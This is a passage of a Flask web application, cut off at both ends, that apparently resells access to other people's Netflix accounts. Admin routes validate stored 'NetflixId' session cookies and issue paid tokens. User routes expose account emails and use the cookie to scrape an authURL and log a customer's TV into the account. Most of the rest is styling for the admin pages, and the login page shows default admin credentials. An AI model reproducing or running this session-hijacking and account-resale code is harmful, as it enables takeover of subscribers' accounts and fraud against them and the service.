        return jsonify({'success': False, 'error': 'No cookies to check'})
    
    # Extract Netflix IDs
    netflix_ids = [c['netflix_id'] for c in cookies]
    
    # Start background job
    job_id = cookie_checker.start_job(netflix_ids, session.get('admin_username', 'admin'))
    
    return jsonify({
        'success': True,
        'job_id': job_id,
        'total': len(netflix_ids)
    })

@app.route('/admin/api/tokens/list')
@admin_required
def admin_list_tokens():
    """List all tokens"""
    tokens = list(tokens_collection.find().sort('created_at', -1))
    for token in tokens:
        token['_id'] = str(token['_id'])
        token['created_at'] = token['created_at'].isoformat() if token['created_at'] else None
        token['expires_at'] = token['expires_at'].isoformat() if token['expires_at'] else None
        token['last_used'] = token['last_used'].isoformat() if token['last_used'] else None
        
        # Update available accounts count
        token['available_accounts'] = cookies_collection.count_documents({
            'is_valid': True,
            'video_quality': token['video_quality'],
            'is_used': {'$ne': True}
        })
    
    return jsonify({'success': True, 'tokens': tokens})

@app.route('/admin/api/tokens/generate', methods=['POST'])
@admin_required
def admin_generate_token():
    """Generate new token with quality check"""
    data = request.get_json(silent=True) or {}
    video_quality = data.get('video_quality', 'SD')
    expiry_days = int(data.get('expiry_days', 30))
    notes = data.get('notes', '')
    
    if video_quality not in VIDEO_QUALITIES:
        return jsonify({'success': False, 'error': f'Invalid quality. Must be one of: {", ".join(VIDEO_QUALITIES)}'})
    
    result = generate_token(
        video_quality=video_quality,
        expiry_days=expiry_days,
        created_by=session.get('admin_username', 'admin'),
        notes=notes
    )
    
    if result['success']:
        return jsonify({
            'success': True,
            'token': result['token'],
            'message': f'✅ Token generated: {result["token"]}\n📊 Available {video_quality} accounts: {result["available"]}'
        })
    else:
        return jsonify({
            'success': False,
            'error': result['error']
        })

@app.route('/admin/api/tokens/check-availability', methods=['POST'])
@admin_required
def admin_check_availability():
    """Check if quality has available accounts"""
    data = request.get_json(silent=True) or {}
    video_quality = data.get('video_quality', 'SD')
    
    available = cookies_collection.count_documents({
        'is_valid': True,
        'video_quality': video_quality,
        'is_used': {'$ne': True}
    })
    
    return jsonify({
        'success': True,
        'available': available,
        'quality': video_quality
    })

@app.route('/admin/api/tokens/delete', methods=['POST'])
@admin_required
def admin_delete_tokens():
    """Delete tokens"""
    data = request.get_json(silent=True) or {}
    tokens = data.get('tokens', [])
    
    if not tokens:
        return jsonify({'success': False, 'error': 'No tokens specified'})
    
    result = tokens_collection.delete_many({'token': {'$in': tokens}})
    
    return jsonify({
        'success': True,
        'deleted': result.deleted_count,
        'message': f'🗑️ Deleted {result.deleted_count} tokens'
    })

@app.route('/admin/api/tokens/update', methods=['POST'])
@admin_required
def admin_update_token():
    """Update token properties"""
    data = request.get_json(silent=True) or {}
    token = data.get('token')
    video_quality = data.get('video_quality')
    expiry_days = data.get('expiry_days')
    is_active = data.get('is_active')
    
    if not token:
        return jsonify({'success': False, 'error': 'No token specified'})
    
    update_data = {}
    if video_quality:
        if video_quality not in VIDEO_QUALITIES:
            return jsonify({'success': False, 'error': f'Invalid quality. Must be one of: {", ".join(VIDEO_QUALITIES)}'})
        update_data['video_quality'] = video_quality
    
    if expiry_days:
        update_data['expires_at'] = datetime.utcnow() + timedelta(days=int(expiry_days))
    
    if is_active is not None:
        update_data['is_active'] = is_active
    
    if update_data:
        tokens_collection.update_one(
            {'token': token},
            {'$set': update_data}
        )
    
    return jsonify({
        'success': True,
        'message': '✅ Token updated successfully'
    })

@app.route('/admin/api/tokens/extend', methods=['POST'])
@admin_required
def admin_extend_tokens():
    """Extend token expiry"""
    data = request.get_json(silent=True) or {}
    tokens = data.get('tokens', [])
    days = int(data.get('days', 30))
    
    if not tokens:
        return jsonify({'success': False, 'error': 'No tokens specified'})
    
    result = tokens_collection.update_many(
        {'token': {'$in': tokens}},
        {'$set': {
            'expires_at': datetime.utcnow() + timedelta(days=days)
        }}
    )
    
    return jsonify({
        'success': True,
        'updated': result.modified_count,
        'message': f'✅ Extended {result.modified_count} tokens by {days} days'
    })

# -------------------------------------------------------------------
# USER ROUTES
# -------------------------------------------------------------------

@app.route('/')
def index():
    """Main user page"""
    return render_template_string(USER_TEMPLATE)

@app.route('/api/validate-token', methods=['POST'])
def validate_token():
    """Validate user token"""
    data = request.get_json(silent=True) or {}
    token = data.get('token', '').strip().upper()
    
    if not token:
        return jsonify({'success': False, 'error': 'Token required'})
    
    # Find token
    token_doc = tokens_collection.find_one({'token': token})
    
    if not token_doc:
        return jsonify({'success': False, 'error': '❌ Invalid token'})
    
    # Check if active
    if not token_doc.get('is_active', False):
        return jsonify({'success': False, 'error': '❌ Token is inactive'})
    
    # Check expiry
    if token_doc['expires_at'] < datetime.utcnow():
        return jsonify({'success': False, 'error': '❌ Token has expired'})
    
    # Check if quality has available accounts
    available = cookies_collection.count_documents({
        'is_valid': True,
        'video_quality': token_doc['video_quality'],
        'is_used': {'$ne': True}
    })
    
    if available == 0:
        return jsonify({'success': False, 'error': f'❌ No {token_doc["video_quality"]} accounts available'})
    
    # Update usage count
    tokens_collection.update_one(
        {'token': token},
        {'$inc': {'usage_count': 1}, '$set': {'last_used': datetime.utcnow()}}
    )
    
    # Store token in session
    session['user_token'] = token
    session['token_quality'] = token_doc['video_quality']
    
    return jsonify({
        'success': True,
        'quality': token_doc['video_quality'],
        'expires_at': token_doc['expires_at'].isoformat(),
        'available': available
    })

@app.route('/api/user/accounts')
def user_accounts():
    """Get accounts for user based on token"""
    if 'user_token' not in session:
        return jsonify({'success': False, 'error': 'No token validated'})
    
    token = session['user_token']
    quality = session['token_quality']
    
    # Get pagination params
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    
    # Get accounts with matching quality that are not used
    query = {
        'is_valid': True,
        'video_quality': quality,
        'is_used': {'$ne': True}
    }
    
    total = cookies_collection.count_documents(query)
    skip = (page - 1) * per_page
    
    accounts = list(cookies_collection.find(
        query, 
        {'_id': 0, 'netflix_id': 1, 'name': 1, 'email': 1, 'country': 1, 
         'video_quality': 1, 'plan': 1, 'connected_profiles': 1, 'profiles': 1}
    ).skip(skip).limit(per_page))
    
    return jsonify({
        'success': True,
        'accounts': accounts,
        'total': total,
        'page': page,
        'per_page': per_page,
        'pages': (total + per_page - 1) // per_page,
        'quality': quality
    })

@app.route('/api/user/login', methods=['POST'])
def user_login():
    """User login to TV"""
    if 'user_token' not in session:
        return jsonify({'success': False, 'error': 'No token validated'})
    
    data = request.get_json(silent=True) or {}
    netflix_id = data.get('netflix_id')
    tv_code = data.get('tv_code', '').strip()
    
    if not netflix_id or not tv_code:
        return jsonify({'success': False, 'error': 'Missing parameters'})
    
    # Validate TV code
    if not re.match(r'^\d{8}$', tv_code):
        return jsonify({'success': False, 'error': 'TV code must be 8 digits'})
    
    # Verify account exists and is valid
    account = cookies_collection.find_one({
        'netflix_id': netflix_id,
        'is_valid': True,
        'video_quality': session['token_quality'],
        'is_used': {'$ne': True}
    })
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not available'})
    
    try:
        # Create session for TV login
        netflix_session = requests.Session()
        netflix_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'
        })
        netflix_session.cookies.update({'NetflixId': netflix_id})
        
        # Get authURL
        auth_url = extract_auth_url(netflix_session)
        if not auth_url:
            return jsonify({'success': False, 'error': 'Failed to get authURL. Account may be invalid.'})
        
        # Perform TV login
        result = perform_tv_login(netflix_session, auth_url, tv_code)
        
        # Log usage
        if result['success']:
            usage_logs_collection.insert_one({
                'token': session['user_token'],
                'cookie_id': netflix_id,
                'account_email': account.get('email', 'Unknown'),
                'used_at': datetime.utcnow(),
                'success': True,
                'ip': request.remote_addr
            })
            
            # Mark account as used
            cookies_collection.update_one(
                {'netflix_id': netflix_id},
                {'$set': {'is_used': True, 'used_at': datetime.utcnow()}}
            )
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'success': False, 'error': 'Login failed'})

@app.route('/api/user/logout')
def user_logout():
    """Clear user session"""
    session.pop('user_token', None)
    session.pop('token_quality', None)
    return jsonify({'success': True})

def extract_auth_url(session):
    """Extract authURL for TV login"""
    try:
        response = session.get('https://www.netflix.com/account', timeout=10)
        text = response.text
        auth_match = re.search(r'"authURL":"([^"]+)"', text)
        if auth_match:
            auth_url = auth_match.group(1)
            return auth_url.replace('\\x2F', '/').replace('\\x3D', '=')
    except Exception as e:
        logger.error(f"Error extracting authURL: {e}")
    return None

def perform_tv_login(session, auth_url, tv_code):
    """Perform TV login with code"""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'origin': 'https://www.netflix.com',
            'referer': 'https://www.netflix.com/account'
        }
        
        data = {
            'flow': 'websiteSignUp',
            'authURL': auth_url,
            'flowMode': 'enterTvLoginRendezvousCode',
            'withFields': 'tvLoginRendezvousCode,isTvUrl2',
            'code': tv_code,
            'tvLoginRendezvousCode': tv_code,
            'isTvUrl2': 'true',
            'action': 'nextAction'
        }
        
        response = session.post('https://www.netflix.com/tv2', headers=headers, data=data, allow_redirects=False, timeout=15)
        
        if response.status_code == 302 and response.headers.get('location') == 'https://www.netflix.com/tv/out/success':
            return {'success': True, 'message': 'TV login successful!'}
        elif "That code wasn't right" in response.text:
            return {'success': False, 'message': 'Invalid TV code. Please check and try again.'}
        else:
            return {'success': False, 'message': 'TV login failed. Please try again.'}
            
    except requests.exceptions.Timeout:
        return {'success': False, 'message': 'Request timeout. Please try again.'}
    except Exception as e:
        logger.error(f"TV login error: {e}")
        return {'success': False, 'message': f'Error: {str(e)}'}

# -------------------------------------------------------------------
# ADMIN LOGIN TEMPLATE (Enhanced with animations)
# -------------------------------------------------------------------

ADMIN_LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login · Netflix TV</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 10% 20%, rgba(229, 9, 20, 0.15) 0%, transparent 30%),
                        radial-gradient(circle at 90% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 30%),
                        linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: gradientShift 15s ease infinite;
            background-size: 400% 400%;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }
        
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 2rem;
            animation: fadeInUp 0.8s ease;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .login-card {
            background: rgba(20, 20, 20, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 2.5rem;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .login-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 30px 50px rgba(229, 9, 20, 0.2);
        }
        
        .logo {
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #E50914 0%, #ff5e5e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            margin-bottom: 1rem;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .logo i {
            margin-right: 0.5rem;
            animation: spin 10s linear infinite;
        }
        
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        h2 {
            text-align: center;
            margin-bottom: 2rem;
            color: #9ca3af;
            font-weight: 400;
            animation: fadeIn 1s ease 0.3s both;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .form-group {
            margin-bottom: 1.5rem;
            animation: slideIn 0.5s ease;
            animation-fill-mode: both;
        }
        
        .form-group:nth-child(1) { animation-delay: 0.1s; }
        .form-group:nth-child(2) { animation-delay: 0.2s; }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #e5e7eb;
            font-weight: 500;
            transition: color 0.3s;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-wrapper i {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            transition: color 0.3s;
        }
        
        input {
            width: 100%;
            padding: 1rem 1rem 1rem 3rem;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #ffffff;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #E50914;
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.1);
            transform: scale(1.02);
        }
        
        input:focus + i {
            color: #E50914;
        }
        
        .btn {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #E50914, #b20710);
            color: #ffffff;
            border: none;
            border-radius: 16px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(229, 9, 20, 0.3);
            position: relative;
            overflow: hidden;
            animation: fadeIn 1s ease 0.4s both;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(229, 9, 20, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .error {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid #ef4444;
            color: #ef4444;
            padding: 1rem;
            border-radius: 16px;
            margin-bottom: 1.5rem;
            text-align: center;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        .info {
            text-align: center;
            margin-top: 1.5rem;
            color: #9ca3af;
            font-size: 0.9rem;
            animation: fadeIn 1s ease 0.5s both;
        }
        
        .info i {
            color: #E50914;
            margin-right: 0.3rem;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-3px); }
        }
        
        .floating-shapes {
            position: fixed;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        
        .shape {
            position: absolute;
            background: rgba(229, 9, 20, 0.1);
            border-radius: 50%;
            animation: float 20s infinite;
        }
        
        .shape:nth-child(1) {
            width: 300px;
            height: 300px;
            top: -150px;
            left: -150px;
            animation-delay: 0s;
        }
        
        .shape:nth-child(2) {
            width: 200px;
            height: 200px;
            bottom: -100px;
            right: -100px;
            animation-delay: -5s;
        }
        
        .shape:nth-child(3) {
            width: 150px;
            height: 150px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -10s;
        }
        
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(30px, 30px) rotate(120deg); }
            66% { transform: translate(-20px, 20px) rotate(240deg); }
        }
    </style>
</head>
<body>
    <div class="floating-shapes">
        <div class="shape"></div>
        <div class="shape"></div>
        <div class="shape"></div>
    </div>
    
    <div class="login-container">
        <div class="login-card">
            <div class="logo">
                <i class="fab fa-netflix"></i>
                ADMIN
            </div>
            <h2>Netflix TV Login System</h2>
            
            {% if error %}
            <div class="error">
                <i class="fas fa-exclamation-circle"></i> {{ error }}
            </div>
            {% endif %}
            
            <form method="POST">
                <div class="form-group">
                    <label><i class="fas fa-user"></i> Username</label>
                    <div class="input-wrapper">
                        <i class="fas fa-user"></i>
                        <input type="text" name="username" required placeholder="admin" autocomplete="off">
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-lock"></i> Password</label>
                    <div class="input-wrapper">
                        <i class="fas fa-lock"></i>
                        <input type="password" name="password" required placeholder="••••••••">
                    </div>
                </div>
                
                <button type="submit" class="btn">
                    <i class="fas fa-sign-in-alt"></i> Login
                </button>
            </form>
            
            <div class="info">
                <i class="fas fa-shield-alt"></i> Default: admin / admin123
            </div>
        </div>
    </div>
</body>
</html>
'''

# -------------------------------------------------------------------
# ADMIN DASHBOARD TEMPLATE (Enhanced with real-time progress)
# -------------------------------------------------------------------

ADMIN_DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard · Netflix TV</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            line-height: 1.5;
        }
        
        /* Animations */
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        @keyframes progressPulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
        
        .app {
            display: flex;
            min-height: 100vh;
        }
        
        /* Sidebar */
        .sidebar {
            width: 280px;
            background: rgba(20, 20, 20, 0.95);
            border-right: 1px solid rgba(255, 255, 255, 0.1);
            padding: 2rem 1.5rem;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            animation: slideIn 0.5s ease;
        }
        
        .logo {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #E50914 0%, #ff5e5e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 2rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            animation: pulse 2s infinite;
        }
        
        .logo i {
            font-size: 2rem;
            animation: spin 10s linear infinite;
        }
        
        .nav-item {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 1rem 1.2rem;
            border-radius: 16px;
            color: #9ca3af;
            margin-bottom: 0.5rem;
            cursor: pointer;
            transition: all 0.3s;
            animation: fadeIn 0.5s ease;
            animation-fill-mode: both;
        }
        
        .nav-item:nth-child(2) { animation-delay: 0.1s; }
        .nav-item:nth-child(3) { animation-delay: 0.2s; }
        .nav-item:nth-child(4) { animation-delay: 0.3s; }
        .nav-item:nth-child(5) { animation-delay: 0.4s; }
        .nav-item:nth-child(6) { animation-delay: 0.5s; }
        
        .nav-item:hover {
            background: rgba(255, 255, 255, 0.05);
            color: #ffffff;
            transform: translateX(5px);
        }
        
        .nav-item.active {
            background: rgba(229, 9, 20, 0.15);
            color: #E50914;
            border-left: 4px solid #E50914;
        }
        
        .nav-item i {
            width: 24px;
            font-size: 1.2rem;
        }
        
        .logout {
            margin-top: 2rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        /* Main Content */
        .main {
            flex: 1;
            margin-left: 280px;
            padding: 2rem;
            animation: fadeIn 0.8s ease;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            animation: slideIn 0.5s ease;
        }
        
        .header h1 {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #fff, #ccc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .user-info {
            background: rgba(255, 255, 255, 0.05);
            padding: 0.8rem 1.5rem;
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: scaleIn 0.5s ease;
        }
        
        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        
        .stat-card {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 1.5rem;
            transition: all 0.3s;
            animation: scaleIn 0.5s ease;
            animation-fill-mode: both;
        }
        
        .stat-card:nth-child(1) { animation-delay: 0.1s; }
        .stat-card:nth-child(2) { animation-delay: 0.2s; }
        .stat-card:nth-child(3) { animation-delay: 0.3s; }
        .stat-card:nth-child(4) { animation-delay: 0.4s; }
        
        .stat-card:hover {
            transform: translateY(-5px);
            border-color: rgba(229, 9, 20, 0.3);
            box-shadow: 0 20px 30px rgba(0, 0, 0, 0.4);
        }
        
        .stat-title {
            color: #9ca3af;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
        }
        
        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            color: #E50914;
        }
        
        .stat-label {
            color: #6b7280;
            font-size: 0.85rem;
            margin-top: 0.5rem;
        }
        
        /* Quality Stats */
        .quality-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin: 1.5rem 0;
        }
        
        .quality-card {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            padding: 1rem;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: all 0.3s;
            animation: scaleIn 0.5s ease;
            animation-fill-mode: both;
            position: relative;
            overflow: hidden;
        }
        
        .quality-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s;
        }
        
        .quality-card:hover::before {
            left: 100%;
        }
        
        .quality-card:nth-child(1) { animation-delay: 0.1s; }
        .quality-card:nth-child(2) { animation-delay: 0.2s; }
        .quality-card:nth-child(3) { animation-delay: 0.3s; }
        .quality-card:nth-child(4) { animation-delay: 0.4s; }
        
        .quality-card.uhd { border-color: #E50914; }
        .quality-card.hd { border-color: #3b82f6; }
        .quality-card.hd720p { border-color: #10b981; }
        .quality-card.sd { border-color: #f59e0b; }
        
        .quality-name {
            font-size: 0.9rem;
            color: #9ca3af;
            margin-bottom: 0.5rem;
        }
        
        .quality-count {
            font-size: 1.8rem;
            font-weight: 700;
        }
        
        .available-count {
            font-size: 0.8rem;
            color: #10b981;
            margin-top: 0.5rem;
        }
        
        /* Content Sections */
        .content-section {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 1.5rem;
            margin-bottom: 2rem;
            animation: fadeIn 0.5s ease;
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        
        .section-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .btn {
            padding: 0.8rem 1.5rem;
            border-radius: 40px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #E50914, #b20710);
            border: none;
        }
        
        .btn-danger {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border-color: #ef4444;
        }
        
        .btn-warning {
            background: rgba(245, 158, 11, 0.2);
            color: #f59e0b;
            border-color: #f59e0b;
        }
        
        .btn-sm {
            padding: 0.5rem 1rem;
            font-size: 0.9rem;
        }
        
        textarea, select, input {
            width: 100%;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #ffffff;
            font-family: 'Inter', monospace;
            margin-bottom: 1rem;
            transition: all 0.3s;
        }
        
        textarea:focus, select:focus, input:focus {
            outline: none;
            border-color: #E50914;
            box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.1);
            transform: scale(1.02);
        }
        
        /* Progress Bar */
        .progress-container {
            margin: 1rem 0;
            animation: fadeIn 0.5s ease;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #E50914, #ff5e5e);
            transition: width 0.3s ease;
            position: relative;
            animation: progressPulse 1.5s infinite;
        }
        
        .progress-text {
            text-align: center;
            margin-top: 0.5rem;
            color: #9ca3af;
            font-size: 0.9rem;
        }
        
        /* Dynamic Stats */
        .dynamic-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
            padding: 1.5rem;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-label-sm {
            color: #9ca3af;
            font-size: 0.85rem;
            margin-bottom: 0.3rem;
        }
        
        .stat-value-sm {
            font-size: 1.5rem;
            font-weight: 700;
        }
        
        .stat-value-sm.valid { color: #10b981; }
        .stat-value-sm.invalid { color: #ef4444; }
        .stat-value-sm.uhd { color: #E50914; }
        .stat-value-sm.hd { color: #3b82f6; }
        .stat-value-sm.hd720p { color: #10b981; }
        .stat-value-sm.sd { color: #f59e0b; }
        
        /* Tables */
        .table-container {
            overflow-x: auto;
            animation: fadeIn 0.5s ease;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            text-align: left;
            padding: 1rem;
            color: #9ca3af;
            font-weight: 500;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        td {
            padding: 1rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            transition: background 0.3s;
        }
        
        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }
        
        .badge {
            padding: 0.3rem 0.8rem;
            border-radius: 40px;
            font-size: 0.85rem;
            font-weight: 500;
            animation: scaleIn 0.3s ease;
        }
        
        .badge-uhd { background: rgba(229, 9, 20, 0.2); color: #E50914; }
        .badge-hd { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
        .badge-hd720p { background: rgba(16, 185, 129, 0.2); color: #10b981; }
        .badge-sd { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
        .badge-valid { background: rgba(16, 185, 129, 0.2); color: #10b981; }
        .badge-invalid { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
        
        .pagination {
            display: flex;
            gap: 0.5rem;
            justify-content: center;
            margin-top: 2rem;
            animation: fadeIn 0.5s ease;
        }
        
        .page-btn {
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #ffffff;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .page-btn:hover {
            background: rgba(229, 9, 20, 0.2);
            border-color: #E50914;
            transform: translateY(-2px);
        }
        
        .page-btn.active {
            background: #E50914;
            border-color: #E50914;
        }
        
        .alert {
            padding: 1rem;
            border-radius: 16px;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            animation: slideIn 0.3s ease;
        }
        
        .alert-success { background: rgba(16, 185, 129, 0.15); color: #10b981; }
        .alert-error { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
        .alert-info { background: rgba(59, 130, 246, 0.15); color: #3b82f6; }
        
        .file-upload {
            border: 2px dashed rgba(229, 9, 20, 0.3);
            border-radius: 16px;
            padding: 2rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 1rem;
        }
        
        .file-upload:hover {
            border-color: #E50914;
            background: rgba(229, 9, 20, 0.05);
        }
        
        .file-upload i {
